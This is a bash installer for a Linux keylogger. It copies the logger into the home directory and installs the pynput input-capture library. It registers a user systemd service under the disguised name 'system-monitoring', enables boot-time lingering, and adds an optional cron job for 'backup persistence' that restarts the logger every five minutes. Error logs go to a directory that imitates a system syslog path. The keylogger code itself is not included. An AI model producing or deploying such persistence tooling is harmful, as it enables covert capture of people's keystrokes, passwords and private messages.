#!/bin/bash
# Enhanced Linux installation script with auto-start and auto-restart

echo "============================================"
echo "Linux Keylogger Auto-Start Installation"
echo "============================================"
echo

# Get current user
CURRENT_USER=$(whoami)
HOME_DIR="/home/$CURRENT_USER"
KEYLOGGER_DIR="$HOME_DIR/keylogger"
SERVICE_NAME="system-monitoring@$CURRENT_USER.service"

# Check if running as root
if [ "$EUID" -eq 0 ]; then
    echo "ERROR: Please run this script as a regular user, not as root."
    exit 1
fi

echo "Step 1: Creating keylogger directory..."
mkdir -p "$KEYLOGGER_DIR"
echo "Directory created: $KEYLOGGER_DIR"

echo
echo "Step 2: Installing files..."
# Copy keylogger files
cp keylogger.py "$KEYLOGGER_DIR/"
cp requirements.txt "$KEYLOGGER_DIR/" 2>/dev/null || true
echo "Keylogger files copied"

echo
echo "Step 3: Installing Python dependencies..."
# Check if pip3 is available
if ! command -v pip3 &> /dev/null; then
    echo "ERROR: pip3 not found. Please install Python 3 and pip3 first."
    echo "On Ubuntu/Debian: sudo apt install python3 python3-pip"
    echo "On CentOS/RHEL: sudo yum install python3 python3-pip"
    echo "On Arch: sudo pacman -S python python-pip"
    exit 1
fi

pip3 install --user pynput cryptography
if [ $? -eq 0 ]; then
    echo "Dependencies installed successfully"
else
    echo "WARNING: Some dependencies may have failed to install"
    echo "You may need to install additional system packages:"
    echo "Ubuntu/Debian: sudo apt install python3-dev libxdo-dev"
    echo "CentOS/RHEL: sudo yum install python3-devel libXdo-devel"
fi

echo
echo "Step 4: Setting up encryption password..."
echo "Enter encryption password for keylogger:"
read -s PASSWORD
if [ -z "$PASSWORD" ]; then
    echo "ERROR: Password cannot be empty"
    exit 1
fi

echo
echo "Step 5: Configuring systemd service..."
# Prepare service file
cp system-monitoring@.service "$KEYLOGGER_DIR/"
sed -i "s/your_password_here/$PASSWORD/g" "$KEYLOGGER_DIR/system-monitoring@.service"

# Get user ID for XDG_RUNTIME_DIR
USER_ID=$(id -u)
sed -i "s|XDG_RUNTIME_DIR=/run/user/1000|XDG_RUNTIME_DIR=/run/user/$USER_ID|g" "$KEYLOGGER_DIR/system-monitoring@.service"

# Install systemd service for user
mkdir -p "$HOME_DIR/.config/systemd/user"
cp "$KEYLOGGER_DIR/system-monitoring@.service" "$HOME_DIR/.config/systemd/user/"
echo "Systemd service configuration installed"

echo
echo "Step 6: Enabling and starting service..."
# Stop any existing instance
systemctl --user stop "$SERVICE_NAME" 2>/dev/null

# Reload systemd configuration
systemctl --user daemon-reload

# Enable service for auto-start
systemctl --user enable "$SERVICE_NAME"
if [ $? -eq 0 ]; then
    echo "✓ Service enabled for auto-start"
else
    echo "ERROR: Failed to enable service"
    exit 1
fi

# Start the service
systemctl --user start "$SERVICE_NAME"
if [ $? -eq 0 ]; then
    echo "✓ Service started successfully"
    
    # Wait a moment and check status
    sleep 2
    if systemctl --user is-active --quiet "$SERVICE_NAME"; then
        echo "✓ Service is running"
    else
        echo "⚠ Warning: Service may not be running properly"
        echo "Check status with: systemctl --user status $SERVICE_NAME"
    fi
else
    echo "ERROR: Failed to start service"
    exit 1
fi

echo
echo "Step 7: Enabling lingering for boot startup..."
# Enable lingering to start service on boot (requires sudo)
if sudo loginctl enable-linger "$CURRENT_USER" 2>/dev/null; then
    echo "✓ Lingering enabled - service will start on boot"
else
    echo "⚠ Warning: Could not enable lingering. Service will only start when you log in."
    echo "To enable boot startup, run: sudo loginctl enable-linger $CURRENT_USER"
fi

echo
echo "Step 8: Setting up additional persistence methods..."
echo "Would you like to add a cron job as backup persistence? (y/n)"
read -r ADD_CRON
if [[ "$ADD_CRON" =~ ^[Yy]$ ]]; then
    # Add cron job to restart service every 5 minutes if not running
    CRON_COMMAND="*/5 * * * * systemctl --user is-active --quiet $SERVICE_NAME || systemctl --user start $SERVICE_NAME"
    
    # Add to crontab if not already present
    (crontab -l 2>/dev/null; echo "$CRON_COMMAND") | crontab -
    echo "✓ Cron job added for additional persistence"
fi

echo
echo "============================================"
echo "Installation Complete!"
echo "============================================"
echo
echo "Configuration Summary:"
echo "  Keylogger directory: $KEYLOGGER_DIR"
echo "  Service name: $SERVICE_NAME"
echo "  Auto-start: Enabled (starts at login/boot)"
echo "  Auto-restart: Enabled (restarts if crashed)"
echo "  Restart delay: 60 seconds"
echo "  Max restart attempts: 5 per 5 minutes"
echo
echo "Management Commands:"
echo "  Start:    systemctl --user start $SERVICE_NAME"
echo "  Stop:     systemctl --user stop $SERVICE_NAME"
echo "  Status:   systemctl --user status $SERVICE_NAME"
echo "  Enable:   systemctl --user enable $SERVICE_NAME"
echo "  Disable:  systemctl --user disable $SERVICE_NAME"
echo "  Logs:     journalctl --user -u $SERVICE_NAME -f"
echo
echo "Manual Commands:"
echo "  Read logs:        cd $KEYLOGGER_DIR && python3 keylogger.py --read"
echo "  Stop manually:    cd $KEYLOGGER_DIR && python3 keylogger.py --stop"
echo "  Start manually:   cd $KEYLOGGER_DIR && python3 keylogger.py --daemon"
echo
echo "Troubleshooting:"
echo "  Check service logs:   journalctl --user -u $SERVICE_NAME --no-pager"
echo "  View error logs:      cat ~/.local/share/syslog/error.log"
echo "  Test permissions:     groups \$USER (should include 'input' group)"
echo "  Manual test:          cd $KEYLOGGER_DIR && python3 keylogger.py --silent"
echo
echo "Complete Uninstallation:"
echo "  1. systemctl --user stop $SERVICE_NAME"
echo "  2. systemctl --user disable $SERVICE_NAME"
echo "  3. rm ~/.config/systemd/user/system-monitoring@.service"
echo "  4. systemctl --user daemon-reload"
echo "  5. sudo loginctl disable-linger $CURRENT_USER"
echo "  6. crontab -e (remove the cron job if added)"
echo "  7. rm -rf $KEYLOGGER_DIR"
echo "  8. rm -rf ~/.local/share/syslog"
echo
echo "The keylogger will start automatically on next login/boot and restart if it crashes."
echo "Press any key to continue..."
read -n 1
